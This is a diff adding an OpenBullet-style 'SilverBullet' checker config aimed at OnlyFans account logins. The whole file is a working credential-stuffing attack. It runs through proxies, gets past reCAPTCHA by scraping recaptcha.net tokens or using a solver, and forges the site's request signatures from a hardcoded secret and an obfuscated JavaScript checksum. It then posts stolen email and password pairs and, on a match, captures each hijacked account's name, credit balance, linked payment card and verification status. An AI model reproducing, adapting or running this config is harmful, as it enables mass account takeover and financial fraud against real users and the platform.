@@ -1,0 +1,417 @@
+[SETTINGS]
+{
+  "Name": "Onlyfans.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-28T10:04:46.8348422+01:00",
+  "AdditionalInfo": "Proxy LQ with Solver And HQ without solver",
+  "RequiredPlugins": [],
+  "Author": "simple",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Using Solver ? y/n (Using Solver Is Better)",
+      "VariableName": "SVY",
+      "Id": 61232640
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Onlyfans",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "RUA" 
+
+FUNCTION Base64Encode "<RUA>" -> VAR "BRUA" 
+
+BEGIN SCRIPT JavaScript
+var Time2 = Date.now();
+var rsign2 = "LYuGzfUCEIC6bwXBlhIb3Lp9RExRJEXv\n"+Time2+"\n/api2/v2/users/login\n0";
+END SCRIPT -> VARS "Time2,rsign2"
+
+FUNCTION Hash SHA1 "<Time2>.NTI3NDcyOTAyMDgzLjExMQ==.NjMzMTQ4ODMwOTAxLjY1ODg=.<BRUA>" -> VAR "bc" 
+
+FUNCTION Hash SHA1 "<rsign2>" -> VAR "sign2" 
+
+IF "<SVY>" EqualTo "y"
+
+#DADASHSOLVE SOLVECAPTCHA ReCaptchaV2 "6LfVUxkUAAAAAFwy-qwWGqKNhT1vqmYF-9ULPAWz" "https://onlyfans.com" 
+
+FUNCTION Constant "<SOLUTION>" -> VAR "SOLVED" 
+
+ELSE
+
+#recap1 REQUEST GET "https://recaptcha.net/recaptcha/api2/anchor?ar=1&k=6LffpXsUAAAAAClHugLBD8pUiaayszY6RUizIubg&co=aHR0cHM6Ly9vbmx5ZmFucy5jb206NDQz&hl=en&v=yZguKF1TiDm6F3yJWVhmOKQ9&size=invisible&cb=e88xa8qhz0z1" 
+  
+  HEADER "referer: https://onlyfans.com/" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: iframe" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36" 
+
+#recap2 PARSE "<SOURCE>" CSS "#recaptcha-token" "value" -> VAR "DASH" 
+
+#recap3 REQUEST POST "https://recaptcha.net/recaptcha/api2/reload?k=6LffpXsUAAAAAClHugLBD8pUiaayszY6RUizIubg" 
+  CONTENT "v=yZguKF1TiDm6F3yJWVhmOKQ9&reason=q&c=<DASH>&k=6LffpXsUAAAAAClHugLBD8pUiaayszY6RUizIubg&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&vh=12489531392&bg=!8Pag9tdHPqKbOHAU9bxd5k78t5Fwc3YHAAABAlcAAAANnAjMuLd2T96OmjJ4rcTWW_UFoJg3MIwoZgFRF_H4F8F8q_oGApse-WuZxSSo4IBY8adlvKm3CvLuOSb2mGM5owpjwO3Mu4KBgwbXDROkXHjZ2Hofr1nNklG_6JwmOjlfMVY9k1unreJjDxMnIm6fFjSTkSaOy8REPo5LRHFoYK02bpc3E8GA1Dsmhum23nwQZif0BGsiFYfhHLvCYqiYP-KbC9_74lW0rcmgFi8yTW-f9kYX1v0-NmTYhiC-UxRcy6InSDNg5JXe8YdH-EzpB4xGezkzZPfHZy-NGNRCukZsTSqomTDOQ6xKHeL1pGxhpyeeG6OHmODvjCSpo9GvC1AwzEKquYTbGsXkhPYAIpkBOciXBtU0nTNaKHcglnzOCUGEHwwuzwRICue1YVUt5SHdd4cyOdK_X0VcXDeWDX1rdMpVjfe2lZf8o9HjLTrnQ87gr_nR7CV4ISdfZxQEqmrC7Q5S9z58qUsganjowqB0uHUTPFYnGsMsZ19N_BSspwD--nj4Er6JLSLQnDDzmKoT7UMeiw2Uh1PGjoWclD8CXeANx3o3HFPD3ocIzVhmFPW9rwj0yMVmuPVa_MJxT86BtKskj0AitXFeX-sFAZ5pn9WyaAaqfdDZF_Fs9xsfV4jJr5VS8-O83sDm60BwVYiFSEA5VqMOCFLbXQVu2Zb4Zgwgvq6U02pqqNMZOlSZ1n3dRLOtbaQLI3_OMSdVkKIaTuHAMjV_zGGY04FJqRCJdab1nVWB38h13SzVtBCI8nQVHBR996GO0Dp7eMQWdSpQaZpij2qdsSdG9osDjWeJ7F5E9KgM4serMeSbGoyyMlvqspigCyWjMbU809-bCAnJpUgPXHlk_YDUAFITRQ0EejKl-iw_zuPvWsvAw0hfeMRHVHYlbaX0RV9_yCnb3VuRQ8dx8IBQ660GDeA6ubmjqTC5g5ncAM1q5T5DcpK4s_FNhPwvvMrsQRQRCC-aZdYKvo0MMMzqDDHJIp9skQLcwFccRjUsiEoq4pZDechg4wDyDAOHE311Se4YSbAqLU45m-nWRjHn0AQUwIczdeT2EgfSXNl3ckRfesJpaMt43fOlb8zGvHxff0kvZFvFuoHSVKn8adVzFUuIciL6nzDkd_x2pmVSClxe3G_qNPMK-mVGLT0JN9MrEE116GKAzRb0Mq_65fyIiO66-9TxohHmGnIHpMmQuyb7xeq7sTt24bk71Dd7nFxuAgrEIZkSF3tcIRDZYBlqlFzFOiAX-_E21jt-5lkzCAKhd4XKnblW4vlDwG4ozUxNE-HgPBDsKEHIQXs7Uq8sLRD-K9wqQTE0PM7xxkOjzCFYFeKQxO7h3o3YPssUamtsdMID1isWGzd0QaL5ZPQ2mCiHpYC8n4MwqK38wyhXXYJ2XyLOZBpdJpr1pcFlA8mz0HO46-Eb9qiLdcxoRnozuFQyQoqkDihcfB8I_tRbLhH1D3gZRI14RYhXxvlUT63_c12IGu1RVBW7UtEjwgEksIec3lelgCF-COmH4f_Qf_TMF4wlRubQIZqYwy4F_yiaifaM83iAiHYF2Upsw4ORR6O3mZONoJUHO-XdRNx9wDlHmv3J1PQx7LbV9KQ16aaVgz3IG4t4OAnQ92wX_mtKDefHLtR-aNH81GijB6pexAbN3mL1l5_PRuOMOvPqSROsBCoH6bUJ4PNPWAYEShMjoDKy3U4mQWmW6MfaekyY1X5nZRMK66mP5OdmBc4eoNRr3Dob6fcKjDv6wk-QI1kvLsGV2i8-wdeJRqr_x8wcsg7RrnXvBxD3vSKsffvWF_qtZX-nm2QyHT538oZVmagHSn00HAggyDL2oUbsQQqL28oVUwkV0Mygofhval2pB8M99vMdMYOS7JbQCff-SNCy2umgWP_r00y91ZQc44ezomO6ITxe28t6GzkQ7ID09pJ_NPZYgPb2mjky_wWpzpRGzQ-FW9j5rBkAU8WUwhLIBoXagFqy2ow-rgp9F0btYz3Jb8wWyGK4K6h-TETacfdIcYFomn-vGKL7gUAehYiRgFVtLpg0_fZ0ozSbm_jD3cyucvjrN4ESfI3kdN-Xe_9FpsJDZW7fxymczaNhxFkxu2LCkVzNaihbTvn9KFq0b5n1klwnEKmrk73pbm8UAdwncPbhYN2MDJsgei5mApEt-uwmCw3xwKHso9wig23zpFrFLZ_ZIJ1ElikA3IvgJ6ppleS_FMwNAIEhnoeAwUzTOpb6gWRhd5drIrlei8Bk-YVe9jWcSDv9iEIT7VRW7wxv9UQI2ePYS2FX_7JdNy--2FlVfMkCnUpe2EiE7TPLMiI8253C5irE00_wlAbf_5jKFJNx87cXwLdXsTNislNroMZZo_tp1u-eIabjVHf53jpbNLf-SO1NOL7JTIYQEBo0hW5cHikWbIhoy7rlURO2uBT1vHgJs6ZnDaDXuiTiss4kD_IwGZ8SsFzAfvS9i1Z9FrdrO86eBTLNRDcwOrjSZhK_kBqZrVunXv35uIrCObqtyFcQXKervDjbew5usrS24-NXPNym5egk5VvbDGGX5bKxV7c6ivX7vYcmC2j1KqCsWYbcy-kFCeaUnHKvlXsWp9ro3HMv_doU7zDrNHjRYCP6VgdfSoH_eEL7qr0f40PGBsViw_MkIkyenriGDi-JZobLmoCPvtIQCZR1ydel8JgFKGSORyrljw_qWCcJaUVe3G72PK31ezGAxs4WS9QPmMHTPIOSX_cbFp-eSzmcHN9qavQT-CCl8piODv1rq-_ICJb0GS-PplPjafSqL89Fo7MiUYjpNcuvjZ14_RnFElVu-EVUwCKcif8aHlIN17yFHF_S6CDfYnAtlpAfmT6vjJRp897p8bbLiSQUaChTXoOfAQjgLk1jn3w80H0Ln9g2KRgOTYYi5T_7NXrB9XyLEgYrkEruK4pMtC4YbyWfNfGu5ZGjlynDZ_0OtCfWckz3oJ-Zmpgbk6jLkSqqRpGwWhI_tVcG9PLUNyCC24QJzVR6p2AG2JA" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://recaptcha.net" 
+  HEADER "referer: https://recaptcha.net/recaptcha/api2/anchor?ar=1&k=6LffpXsUAAAAAClHugLBD8pUiaayszY6RUizIubg&co=aHR0cHM6Ly9vbmx5ZmFucy5jb206NDQz&hl=en&v=yZguKF1TiDm6F3yJWVhmOKQ9&size=invisible&cb=e88xa8qhz0z1" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36" 
+
+#recap4 PARSE "<SOURCE>" LR "\"rresp\",\"" "\"" -> VAR "SOLVED" 
+
+ENDIF
+BEGIN SCRIPT JavaScript
+s = {
+    J: function(t, e) {
+        return t + e
+    },
+    Z: function(t, e) {
+        return t + e
+    },
+    W: function(t, e) {
+        return t + e
+    },
+    w: function(t, e) {
+        return t + e
+    },
+    N: function(t, e) {
+        return t + e
+    },
+    K: function(t, e) {
+        return t + e
+    },
+    f: function(t, e) {
+        return t + e
+    },
+    D: function(t, e) {
+        return t + e
+    },
+    q: function(t, e) {
+        return t + e
+    },
+    b: function(t, e) {
+        return t + e
+    },
+    e: function(t, e) {
+        return t + e
+    },
+    F: function(t, e) {
+        return t + e
+    },
+    U: function(t, e) {
+        return t + e
+    },
+    x: function(t, e) {
+        return t - e
+    },
+    t: function(t, e) {
+        return t % e
+    },
+    L: function(t, e) {
+        return t + e
+    },
+    G: function(t, e) {
+        return t % e
+    },
+    k: function(t, e) {
+        return t + e
+    },
+    V: function(t, e) {
+        return t + e
+    },
+    u: function(t, e) {
+        return t % e
+    },
+    B: function(t, e) {
+        return t + e
+    },
+    A: function(t, e) {
+        return t - e
+    },
+    E: function(t, e) {
+        return t % e
+    },
+    i: function(t, e) {
+        return t + e
+    },
+    H: function(t, e) {
+        return t % e
+    },
+    j: function(t, e) {
+        return t + e
+    },
+    n: function(t, e) {
+        return t % e
+    },
+    m: function(t, e) {
+        return t % e
+    },
+    O: function(t, e) {
+        return t + e
+    },
+    s: function(t, e) {
+        return t % e
+    },
+    Q: function(t, e) {
+        return t - e
+    },
+    v: function(t, e) {
+        return t % e
+    },
+    T: function(t, e) {
+        return t - e
+    },
+    C: function(t, e) {
+        return t % e
+    },
+    I: function(t, e) {
+        return t % e
+    }
+      };
+var t = sign2;
+var ahba2 = Math['abs'](s["J"](s["J"](s["Z"](s["W"](s["W"](s["w"](s["N"](s["N"](s["N"](s["N"](s["K"](s["K"](s["K"](s["f"](s["f"](s["f"](s["D"](s["q"](s["q"](s["b"](s["b"](s["e"](s["e"](s["e"](s["e"](s["F"](s["F"](s["F"](s["U"](s["x"](t[s["t"](2550, t['length'])]['charCodeAt'](0), 73), s["x"](t[s["t"](3425, t['length'])]['charCodeAt'](0), 68)), s["L"](t[s["G"](2648, t['length'])]['charCodeAt'](0), 122)), s["L"](t[s["G"](3087, t['length'])]['charCodeAt'](0), 103)), t[3634 % t['length']]['charCodeAt'](0) - 85), s["k"](t[s["G"](2254, t['length'])]['charCodeAt'](0), 96)), s["V"](t[1670 % t['length']]['charCodeAt'](0), 124)), s["x"](t[s["u"](2721, t['length'])]['charCodeAt'](0), 74)), s["V"](t[3821 % t['length']]['charCodeAt'](0), 115)), s["B"](t[2499 % t['length']]['charCodeAt'](0), 79)), s["x"](t[s["u"](3206, t['length'])]['charCodeAt'](0), 125)), s["A"](t[s["E"](3567, t['length'])]['charCodeAt'](0), 84)), t[s["E"](2311, t['length'])]['charCodeAt'](0) - 64), s["i"](t[s["E"](1983, t['length'])]['charCodeAt'](0), 113)) + (t[s["H"](4131, t['length'])]['charCodeAt'](0) - 120), s["j"](t[s["H"](1901, t['length'])]['charCodeAt'](0), 87)), s["j"](t[s["n"](3358, t['length'])]['charCodeAt'](0), 84)), s["j"](t[s["m"](2933, t['length'])]['charCodeAt'](0), 129)), s["j"](t[2999 % t['length']]['charCodeAt'](0), 89)), s["O"](t[s["s"](2423, t['length'])]['charCodeAt'](0), 135)), s["A"](t[s["s"](3719, t['length'])]['charCodeAt'](0), 92)), s["A"](t[s["s"](4014, t['length'])]['charCodeAt'](0), 85)), s["Q"](t[s["s"](1827, t['length'])]['charCodeAt'](0), 72)) + s["O"](t[s["s"](3943, t['length'])]['charCodeAt'](0), 129), s["Q"](t[s["v"](4220, t['length'])]['charCodeAt'](0), 117)), s["O"](t[s["v"](2825, t['length'])]['charCodeAt'](0), 113)), t[2172 % t['length']]['charCodeAt'](0) - 97), s["T"](t[s["C"](3498, t['length'])]['charCodeAt'](0), 83)), s["O"](t[s["C"](2103, t['length'])]['charCodeAt'](0), 143)), s["O"](t[s["C"](3304, t['length'])]['charCodeAt'](0), 106)), t[s["I"](4296, t['length'])]['charCodeAt'](0) + 84), t[1758 % t['length']]['charCodeAt'](0) + 118))['toString'](16);
+END SCRIPT -> VARS "ahba2"
+
+#login REQUEST POST "https://onlyfans.com/api2/v2/users/login" 
+  CONTENT "{\"username\":\"\",\"email\":\"<USER>\",\"password\":\"<PASS>\",\"g-recaptcha-response\":\"<SOLVED>\"}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "fp: f454ce8fa86d557032b1799c1652274a" 
+  COOKIE "ref_src: " 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "app-token: 33d57ade8c02dbc5a333db99ff9ae26a" 
+  HEADER "Origin: https://onlyfans.com" 
+  HEADER "Referer: https://onlyfans.com/" 
+  HEADER "sign: 1552:<sign2>:<ahba2>:6193f09d" 
+  HEADER "time: <Time2>" 
+  HEADER "user-agent: <RUA>" 
+  HEADER "x-bc: <bc>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"accessToken\":\"" 
+    KEY "\"userId\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"Wrong email or password\"" 
+    KEY "Email is not valid" 
+  KEYCHAIN Ban OR 
+    KEY "Captcha Wrong" 
+
+PARSE "<SOURCE>" JSON "userId" -> VAR "userId" 
+
+BEGIN SCRIPT JavaScript
+var Time3 = Date.now();
+var rsign3 = "LYuGzfUCEIC6bwXBlhIb3Lp9RExRJEXv\n"+Time3+"\n/api2/v2/users/me\n0";
+END SCRIPT -> VARS "Time3,rsign3"
+
+FUNCTION Hash SHA1 "<rsign3>" -> VAR "sign3" 
+
+BEGIN SCRIPT JavaScript
+s = {
+    J: function(t, e) {
+        return t + e
+    },
+    Z: function(t, e) {
+        return t + e
+    },
+    W: function(t, e) {
+        return t + e
+    },
+    w: function(t, e) {
+        return t + e
+    },
+    N: function(t, e) {
+        return t + e
+    },
+    K: function(t, e) {
+        return t + e
+    },
+    f: function(t, e) {
+        return t + e
+    },
+    D: function(t, e) {
+        return t + e
+    },
+    q: function(t, e) {
+        return t + e
+    },
+    b: function(t, e) {
+        return t + e
+    },
+    e: function(t, e) {
+        return t + e
+    },
+    F: function(t, e) {
+        return t + e
+    },
+    U: function(t, e) {
+        return t + e
+    },
+    x: function(t, e) {
+        return t - e
+    },
+    t: function(t, e) {
+        return t % e
+    },
+    L: function(t, e) {
+        return t + e
+    },
+    G: function(t, e) {
+        return t % e
+    },
+    k: function(t, e) {
+        return t + e
+    },
+    V: function(t, e) {
+        return t + e
+    },
+    u: function(t, e) {
+        return t % e
+    },
+    B: function(t, e) {
+        return t + e
+    },
+    A: function(t, e) {
+        return t - e
+    },
+    E: function(t, e) {
+        return t % e
+    },
+    i: function(t, e) {
+        return t + e
+    },
+    H: function(t, e) {
+        return t % e
+    },
+    j: function(t, e) {
+        return t + e
+    },
+    n: function(t, e) {
+        return t % e
+    },
+    m: function(t, e) {
+        return t % e
+    },
+    O: function(t, e) {
+        return t + e
+    },
+    s: function(t, e) {
+        return t % e
+    },
+    Q: function(t, e) {
+        return t - e
+    },
+    v: function(t, e) {
+        return t % e
+    },
+    T: function(t, e) {
+        return t - e
+    },
+    C: function(t, e) {
+        return t % e
+    },
+    I: function(t, e) {
+        return t % e
+    }
+      };
+var t = sign3;
+var ahba3 = Math['abs'](s["J"](s["J"](s["Z"](s["W"](s["W"](s["w"](s["N"](s["N"](s["N"](s["N"](s["K"](s["K"](s["K"](s["f"](s["f"](s["f"](s["D"](s["q"](s["q"](s["b"](s["b"](s["e"](s["e"](s["e"](s["e"](s["F"](s["F"](s["F"](s["U"](s["x"](t[s["t"](2550, t['length'])]['charCodeAt'](0), 73), s["x"](t[s["t"](3425, t['length'])]['charCodeAt'](0), 68)), s["L"](t[s["G"](2648, t['length'])]['charCodeAt'](0), 122)), s["L"](t[s["G"](3087, t['length'])]['charCodeAt'](0), 103)), t[3634 % t['length']]['charCodeAt'](0) - 85), s["k"](t[s["G"](2254, t['length'])]['charCodeAt'](0), 96)), s["V"](t[1670 % t['length']]['charCodeAt'](0), 124)), s["x"](t[s["u"](2721, t['length'])]['charCodeAt'](0), 74)), s["V"](t[3821 % t['length']]['charCodeAt'](0), 115)), s["B"](t[2499 % t['length']]['charCodeAt'](0), 79)), s["x"](t[s["u"](3206, t['length'])]['charCodeAt'](0), 125)), s["A"](t[s["E"](3567, t['length'])]['charCodeAt'](0), 84)), t[s["E"](2311, t['length'])]['charCodeAt'](0) - 64), s["i"](t[s["E"](1983, t['length'])]['charCodeAt'](0), 113)) + (t[s["H"](4131, t['length'])]['charCodeAt'](0) - 120), s["j"](t[s["H"](1901, t['length'])]['charCodeAt'](0), 87)), s["j"](t[s["n"](3358, t['length'])]['charCodeAt'](0), 84)), s["j"](t[s["m"](2933, t['length'])]['charCodeAt'](0), 129)), s["j"](t[2999 % t['length']]['charCodeAt'](0), 89)), s["O"](t[s["s"](2423, t['length'])]['charCodeAt'](0), 135)), s["A"](t[s["s"](3719, t['length'])]['charCodeAt'](0), 92)), s["A"](t[s["s"](4014, t['length'])]['charCodeAt'](0), 85)), s["Q"](t[s["s"](1827, t['length'])]['charCodeAt'](0), 72)) + s["O"](t[s["s"](3943, t['length'])]['charCodeAt'](0), 129), s["Q"](t[s["v"](4220, t['length'])]['charCodeAt'](0), 117)), s["O"](t[s["v"](2825, t['length'])]['charCodeAt'](0), 113)), t[2172 % t['length']]['charCodeAt'](0) - 97), s["T"](t[s["C"](3498, t['length'])]['charCodeAt'](0), 83)), s["O"](t[s["C"](2103, t['length'])]['charCodeAt'](0), 143)), s["O"](t[s["C"](3304, t['length'])]['charCodeAt'](0), 106)), t[s["I"](4296, t['length'])]['charCodeAt'](0) + 84), t[1758 % t['length']]['charCodeAt'](0) + 118))['toString'](16);
+END SCRIPT -> VARS "ahba3"
+
+REQUEST GET "https://onlyfans.com/api2/v2/users/me" 
+  
+  COOKIE "fp: f454ce8fa86d557032b1799c1652274a" 
+  COOKIE "ref_src: " 
+  COOKIE "auth_id: <userId>" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fa-IR,fa;q=0.9" 
+  HEADER "app-token: 33d57ade8c02dbc5a333db99ff9ae26a" 
+  HEADER "Connection: keep-alive" 
+  HEADER "DNT: 1" 
+  HEADER "Host: onlyfans.com" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "sign: 1552:<sign3>:<ahba3>:6193f09d" 
+  HEADER "time: <Time3>" 
+  HEADER "User-Agent: <RUA>" 
+  HEADER "x-bc: <bc>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "Access denied" 
+
+PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Name" 
+
+PARSE "<SOURCE>" JSON "lastSeen" CreateEmpty=FALSE -> CAP "Last Seen" 
+
+PARSE "<SOURCE>" JSON "subscribesCount" CreateEmpty=FALSE -> CAP "Subscribers" 
+
+PARSE "<SOURCE>" JSON "creditBalance" CreateEmpty=FALSE -> CAP "Credit Balance" 
+
+PARSE "<SOURCE>" JSON "isPaymentCardConnected" CreateEmpty=FALSE -> CAP "Payment Card" 
+
+PARSE "<SOURCE>" JSON "isEmailChecked" CreateEmpty=FALSE -> CAP "Verified" 
+
